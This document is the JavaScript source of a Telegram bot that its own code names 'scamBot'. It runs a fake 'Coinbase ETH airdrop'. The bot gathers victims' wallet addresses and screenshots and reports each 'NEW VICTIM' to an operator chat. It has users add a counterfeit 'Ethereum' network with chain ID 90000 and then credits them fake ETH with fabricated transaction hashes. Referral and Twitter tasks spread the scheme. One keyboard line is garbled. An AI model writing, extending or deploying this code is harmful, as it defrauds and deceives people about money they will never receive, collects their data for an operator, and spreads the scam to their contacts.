require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const axios = require('axios');

// === CONFIG ===
const SCAM_BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const TENDERLY_RPC = process.env.TENDERLY_RPC;

// === BOTS ===
const scamBot = new Telegraf(SCAM_BOT_TOKEN);
const adminBot = new Telegraf(ADMIN_BOT_TOKEN);

// === IN-MEMORY DB ===
let usersDB = {};
const getUser = (id) => usersDB[id] || null;
const saveUser = (user) => { usersDB[user.telegramId] = user; return user; };
const updateUser = (id, updates) => {
  if (usersDB[id]) Object.assign(usersDB[id], updates);
  return usersDB[id];
};
const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);

// === ESCAPE LINK ===
const escapeLink = (code) => `t\\.me/coinbase\\_eth\\_airdrop\\_bot?start=ref_${code}`;

// === RPC GUIDE ===
const RPC_GUIDE = `
Add this network to Coinbase Wallet:

**Network Name:** Ethereum
**RPC URL:** https://virtual.mainnet.eu.rpc.tenderly.co/4044dd2f-00ef-4abb-95ab-68ef8a62d13d
**Chain ID:** 90000
**Currency:** ETH
`.trim();

// === SEND TO ADMIN ===
const sendToAdmin = async (text, photoFileId = null, postLink = null) => {
  try {
    let caption = text;
    if (postLink) caption += `\nPost: ${postLink}`;

    if (photoFileId) {
      const file = await scamBot.telegram.getFile(photoFileId);
      const fileUrl = `https://api.telegram.org/file/bot${SCAM_BOT_TOKEN}/${file.file_path}`;
      const response = await axios.get(fileUrl, { responseType: 'arraybuffer' });
      const buffer = Buffer.from(response.data);
      await adminBot.telegram.sendPhoto(ADMIN_CHAT_ID, { source: buffer }, { caption, parse_mode: 'Markdown' });
    } else {
      await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, caption, { parse_mode: 'Markdown', disable_web_page_preview: true });
    }
  } catch (err) {
    console.error('ADMIN SEND FAILED:', err.message);
  }
};

// === FAKE ETH SEND ===
const sendFakeETH = async (to, eth) => {
  if (!to || to.startsWith('0xFAKE')) return;
  const wei = (eth * 1e18).toString(16);
  try {
    await axios.post(TENDERLY_RPC, {
      jsonrpc: "2.0", method: "eth_sendTransaction",
      params: [{ from: "0x0000000000000000000000000000000000000001", to, value: `0x${wei}` }], id: Date.now()
    });
  } catch {}
};

// === MENU AFTER CLAIM ===
const menuKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback('Profile', 'menu_profile')],
  [Markup.button.callback('Referral Link', 'menu_referral')],
  [Markup.button.callback('Bonus', 'menu_bonus')],
  [Markup.button.callback('Leaderboard', 'menu_leaderboard')]
]);

// === /start — SMART MENU OR FLOW ===
scamBot.start(async (ctx) => {
  let user = getUser(ctx.from.id);
  const refCode = ctx.startPayload?.startsWith('ref_') ? ctx.startPayload.slice(4) : null;

  if (!user) {
    const code = Math.random().toString(36).substr(2, 8).toUpperCase();
    user = {
      telegramId: ctx.from.id,
      username: ctx.from.username || 'NoUsername',
      referralCode: code,
      referredBy: refCode,
      stage: 'wallet_input',
      wallet: null,
      referrals: [],
      totalEarned: 0,
      claimed50: false,
      twitterPostLink: null
    };
    saveUser(user);

    if (refCode) {
      const referrer = getUserByCode(refCode);
      if (referrer && referrer.telegramId !== ctx.from.id) {
        referrer.referrals.push(ctx.from.id);
        referrer.totalEarned += 10;
        updateUser(referrer.telegramId, referrer);
        await sendFakeETH(referrer.wallet || '0xFAKE', 0.004);
        scamBot.telegram.sendMessage(referrer.telegramId,
          `*+1 Referral!* $10 sent.\nTotal: $${referrer.totalEarned}\n` +
          `Link: ${escapeLink(referrer.referralCode)}`
        );
      }
    }

    await sendToAdmin(`*NEW VICTIM*\nUser: @${user.username}\nID: \`${user.telegramId}\`\nRef: \`${code}\``);
    ctx.reply(`Send your *Coinbase wallet address* (text) + *screenshot* (photo).`, Markup.inlineKeyboard([[Markup.button.callback('Send Wallet + SS', 'send_wallet')]]));
  } else if (user.claimed50) {
    // ALREADY CLAIMED → SHOW MENU
    ctx.reply(`*Welcome back, @${user.username}!*\nYou already claimed $50 ETH.`, menuKeyboard);
  } else {
    ctx.reply(`Continue your airdrop:\nStage: ${user.stage}`, Markup.inlineKeyboard([[Markup.button.callback('Resume', 'send_wallet')]]));
  }
});

// === TEXT + PHOTO HANDLER ===
scamBot.on('text', async (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'wallet_input') return;

  const wallet = ctx.message.text.trim();
  if (!/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
    return ctx.reply(`Invalid wallet. Send valid 0x... address.`);
  }

  user.wallet = wallet;
  user.stage = 'rpc_guide';
  saveUser(user);

  await sendToAdmin(`*WALLET INPUT*\nUser: @${user.username}\nWallet: \`${wallet}\``);
  ctx.reply(RPC_GUIDE, Markup.inlineKeyboard([[Markup.button.callback('I Added Network', 'rpc_done')]]));
});

scamBot.on('photo', async (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start.');

  const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;

  if (user.stage === 'wallet_input') {
    const wallet = ctx.message.caption?.trim();
    if (wallet && /^0x[a-fA-F0-9]{40}$/.test(wallet)) {
      user.wallet = wallet;
      user.stage = 'rpc_guide';
      saveUser(user);
      await sendToAdmin(`*WALLET + SS*\nUser: @${user.username}\nWallet: \`${wallet}\``, fileId);
      ctx.reply(RPC_GUIDE, Markup.inlineKeyboard([[Markup.button.callback('I Added Network', 'rpc_done')]]));
    } else {
      ctx.reply(`Send wallet address in *caption*.`);
    }
    return;
  }

  if (user.stage === 'rpc_proof') {
    user.stage = 'twitter_tasks';
    saveUser(user);
    await sendToAdmin(`*RPC PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\``, fileId);
    ctx.reply(
      `*Twitter Task:*\n1. Follow @BjExchange53077\n2. Like pinned\n3. *Quote* it\n4. Tag 3 friends\n5. Send *post link* + screenshot`,
      Markup.inlineKeyboard([[Markup.button.callback('Send Twitter Proof', 'send_twitter_proof')]])
    );
    return;
  }

  if (user.stage === 'twitter_proof') {
    const postLink = ctx.message.caption?.match(/https?:\/\/[^\s]+/)?.[0] || 'No link';
    user.twitterPostLink = postLink;
    user.stage = 'claim_ready';
    saveUser(user);

    await sendToAdmin(`*TWITTER PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\`\nPost: ${postLink}`, fileId);
    ctx.reply(`*Tasks verified!* Claim $50 ETH:`, Markup.inlineKeyboard([[Markup.button.callback('CLAIM $50 ETH', 'claim_eth')]]));
    return;
  }
});

// === BUTTONS ===
scamBot.action('send_wallet', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return;
  user.stage = 'wallet_input';
  saveUser(user);
  ctx.editMessageText(`Send wallet address (text/caption) + screenshot.`);
});

scamBot.action('rpc_done', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'rpc_guide') return;
  user.stage = 'rpc_proof';
  saveUser(user);
  ctx.editMessageText(`Send Chain ID 90000 proof.`, Markup.inlineKeyboard([[Markup.button.callback('Send RPC Proof', 'send_rpc_proof')]]));
});

scamBot.action('send_rpc_proof', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'rpc_proof') return;
  ctx.editMessageText(`Send proof now.`);
});

scamBot.action('send_twitter_proof', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'twitter_tasks') return;
  user.stage = 'twitter_proof';
  saveUser(user);
  ctx.editMessageText(`Send *screenshot + post link in caption*.`, { parse_mode: 'Markdown' });
});

// === CLAIM ONCE ONLY ===
scamBot.action('claim_eth', async (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user || user.stage !== 'claim_ready') {
    await ctx.answerCbQuery('Not ready.');
    return;
  }

  if (user.claimed50) {
    await ctx.answerCbQuery('Already claimed $50!');
    return;
  }

  user.claimed50 = true;
  user.stage = 'claimed';
  saveUser(user);
  await sendFakeETH(user.wallet, 0.02);

  const txHash = "0xFAKE" + Math.random().toString(16).substr(2, 64);
  const claimMsg = 
    `*CLAIMED!* $50 ETH sent to:\n\`\`\`\n${user.wallet}\`\`\`\n\n` +
    `Tx: https://dashboard.tenderly.co/tx/mainnet/${txHash}\n\n` +
    `*Share:*\n${escapeLink(user.referralCode)}`;

  await ctx.telegram.sendMessage(ctx.from.id, claimMsg, { parse_mode: 'Markdown' });
  await ctx.answerCbQuery('Claimed!');

  await sendToAdmin(
    `*CLAIMED $50 ETH*\nUser: @${user.username}\nWallet: \`${user.wallet}\`\nTx: \`${txHash}\``
  );

  // Show menu
  ctx.reply(`*Welcome to your dashboard!*`, menuKeyboard);
});

// === MENU ACTIONS ===
scamBot.action('menu_profile', (ctx) => {
  const user = getUser(ctx.from.id);
  ctx.editMessageText(
    `*PROFILE*\n\n` +
    `User: @${user.username}\n` +
    `Wallet: \`${user.wallet}\`\n` +
    `Earned: $${user.totalEarned}\n` +
    `Referrals: ${user.referrals.length}\n` +
    `Link: ${escapeLink(user.referralCode)}`,
    { parse_mode: 'Markdown' }
  );
});

scamBot.action('menu_referral', (ctx) => {
  const user = getUser(ctx.from.id);
  ctx.editMessageText(
    `*REFERRAL LINK*\n\nEarn $10 per referral:\n${escapeLink(user.referralCode)}\n\nYou have ${user.referrals.length} referrals.`,
    { parse_mode: 'Markdown' }
  );
});

scamBot.action('menu_bonus', (ctx) => {
  const user = getUser(ctx.from.id);
  const bonus = user.referrals.length * 10;
  ctx.editMessageText(
    `*YOUR BONUS*\n\n` +
    `Referrals: ${user.referrals.length}\n` +
    `Bonus: $${bonus}\n\n` +
    `Click to withdraw:`,
    { 
      parse_mode: 'Markdown',
      reply_markup: { inline licha_keyboard: [[{ text: 'WITHDRAW BONUS', callback_data: 'withdraw_bonus' }]] }
    }
  );
});

scamBot.action('menu_leaderboard', (ctx) => {
  const top = Object.values(usersDB).sort((a, b) => b.totalEarned - a.totalEarned).slice(0, 10);
  let text = `*LEADERBOARD*\n\n`;
  top.forEach((u, i) => text += `${i + 1}. @${u.username} — $${u.totalEarned} (${u.referrals.length} refs)\n`);
  ctx.editMessageText(text, { parse_mode: 'Markdown' });
});

// === /bonus COMMAND ===
scamBot.command('bonus', (ctx) => {
  const user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start.');
  const bonus = user.referrals.length * 10;
  ctx.reply(
    `*YOUR BONUS*\n\n` +
    `Referrals: ${user.referrals.length}\n` +
    `Total: $${bonus}\n\n` +
    `Click to withdraw:`,
    { 
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: [[{ text: 'WITHDRAW BONUS', callback_data: 'withdraw_bonus' }]] }
    }
  );
});

scamBot.action('withdraw_bonus', async (ctx) => {
  const user = getUser(ctx.from.id);
  const bonus = user.referrals.length * 10;
  if (bonus === 0) return ctx.answerCbQuery('No bonus.');

  await sendFakeETH(user.wallet, bonus / 250); // Fake send
  ctx.answerCbQuery(`$${bonus} sent!`);
  ctx.editMessageText(`*BONUS WITHDRAWN*\n$${bonus} sent to ${user.wallet}`, { parse_mode: 'Markdown' });
  await sendToAdmin(`*BONUS WITHDRAWN*\nUser: @${user.username}\nAmount: $${bonus}\nWallet: \`${user.wallet}\``);
});

// === SERVER ===
scamBot.catch((err, ctx) => console.error('ERROR:', err));

const app = express();
app.use(express.json());
app.use(scamBot.webhookCallback(`/bot${SCAM_BOT_TOKEN}`));

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`Bot LIVE on ${PORT}`);
  await scamBot.telegram.setWebhook(`${process.env.RENDER_EXTERNAL_URL}/bot${SCAM_BOT_TOKEN}`);
  adminBot.launch();
});
